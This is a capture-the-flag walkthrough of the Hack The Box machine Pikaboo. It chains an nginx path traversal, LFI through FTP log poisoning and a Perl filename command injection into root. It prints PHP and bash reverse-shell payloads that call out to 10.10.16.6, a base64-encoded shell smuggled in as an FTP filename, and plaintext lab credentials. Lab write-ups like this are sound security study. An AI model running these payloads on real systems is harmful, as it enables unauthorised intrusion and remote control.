# [Pikaboo](https://app.hackthebox.com/machines/Pikaboo)

```bash
nmap -p- --min-rate 10000 10.10.10.249 -Pn
```

![Alt text](img/image.png)

After discovering open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p21,22,80 10.10.10.249
```

![Alt text](img/image-1.png)


Let's access web application.

![Alt text](img/image-2.png)


While, I want to access `admin` page, it says that Unauthorized due to credentials which I don't know.

![Alt text](img/image-3.png)


But I know that it is `nginx` server and I can bypass it via adding `../` characters.

![Alt text](img/image-4.png)


Let's look at `server-status` endpoint via `admin` page.

![Alt text](img/image-5.png)


While I enter URL 'admin../pokatdex' it redirects into  below page, it means I can access localhost admin page.

![Alt text](img/image-6.png)


For this, I will try 'admin../admin_staging'

![Alt text](img/image-7.png)


I found LFI on `page` parameter .

![Alt text](img/image-8.png)

From `nmap` enumeration, I saw that FTP's software is `vsftpd`, let's look at log file of FTP service via visitng `/var/log/vsftpd.log`

![Alt text](img/image-9.png)


From here, we can see successful or unsuccessful login attempts, if we add malicious payload into username parameter, we can browse this malicious payload by LFI vulnerability.

1.Let's add payload into username field of ftp service.
`<?php system('id'); ?>`

![Alt text](img/image-10.png)

2.Let's browse the page where LFI vulnerability have.

![Alt text](img/image-11.png)


Let's add our reverse shell payload into username field as below.
```bash
<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.6/1337 0>&1"'); ?>
```

![Alt text](img/image-12.png)


I browse the page.

![Alt text](img/image-13.png)


I got reverse shell from port (1337)..

![Alt text](img/image-14.png)


Let's make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-15.png)


user.txt

![Alt text](img/image-16.png)


Let's look at crontab by typing `cat /etc/crontab` into Terminal and saw cronjob here.

![Alt text](img/image-17.png)


I looked at `csvupdate` script which is `Perl` script.

![Alt text](img/image-18.png)


I enumerate machine more and find sensitive credentials on '/opt/pokeapi/config' directory for `settings.py` file.


![Alt text](img/image-19.png)


I used this credentials to enumerrate `LDAP` via `ldapsearch` command.
```bash
ldapsearch -h 127.0.0.1 -x -b 'dc=htb' -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g'           
```

![Alt text](img/image-20.png)


Hola, I found password of `pwnmeow` user via decoding by using `base64`.

```bash
echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
```

![Alt text](img/image-21.png)


pwnmeow: _G0tT4_C4tcH_'3m_4lL!_


I find a `Command Injection`  for `Perl` language.

My perl script is below.

```perl
#!/usr/bin/perl


shift;
for(<>)
{
  print $_;
}
```

I create a file as below which I inject `id` command.

```bash
touch '|id; #.csv'
```


I run a script as below.
```bash
perl test.pl ignore *.csv
```


![Alt text](img/image-22.png)


I looked at `ftp` group and see that `pwnmeow` user.

![Alt text](img/image-23.png)


Let's add our malicious payload into FTP service and waits for reverse shell.

1.First, create reverse shell in `base64` format.
```bash
echo 'bash -i >& /dev/tcp/10.10.16.6/1338 0>&1' | base64
```

2.Access into FTP service via previously grabbed credentials.
```bash
put test.txt "|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzEzMzggMD4mMQo=|base64 -d|bash; a.csv"
```


![Alt text](img/image-24.png)


I got reverse shell from port (1338).

![Alt text](img/image-25.png)


root.txt

![Alt text](img/image-26.png)